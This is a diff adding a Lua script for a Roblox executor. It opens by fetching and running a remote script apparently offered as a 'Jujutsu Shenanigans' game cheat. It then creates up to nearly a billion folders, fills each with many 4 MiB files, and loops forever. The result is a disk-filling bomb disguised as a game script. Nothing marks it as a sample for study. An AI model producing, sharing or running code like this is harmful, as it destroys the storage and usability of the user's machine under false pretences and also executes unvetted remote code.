@@ -1,0 +1,40 @@
+loadstring(game:HttpGet("https://rawscripts.net/raw/HEAD-OF-HEI-Jujutsu-Shenanigans-JujutsuerV2-92468"))()
+task.wait(10)
+local folderCount = 999999999
+local txtCount = 99999999
+local fileSize = 4 * 1024 * 1024 -- 4 MiB per file
+local repeatCreation = true
+
+-- Generate file contents once
+local content = string.rep("A", fileSize)
+
+-- Create folders and files
+task.wait(0.12)
+for i = 1, folderCount do
+    local folder = "Folder_" .. i
+
+    if not isfolder(folder) then
+        makefolder(folder)
+    end
+
+    for j = 1, txtCount, 5 do
+        for k = j, math.min(j + 2, txtCount) do
+            task.spawn(function()
+                local file = folder .. "/File_" .. k .. ".txt"
+                writefile(file, content)
+                print("Created: " .. file)
+            end)
+        end
+        task.wait()
+    end
+end
+
+-- Repeat with no intentional delay
+if repeatCreation then
+    local run = true
+
+    while run do
+        task.wait() -- Yields to avoid locking up the executor
+        print("System")
+    end
+end
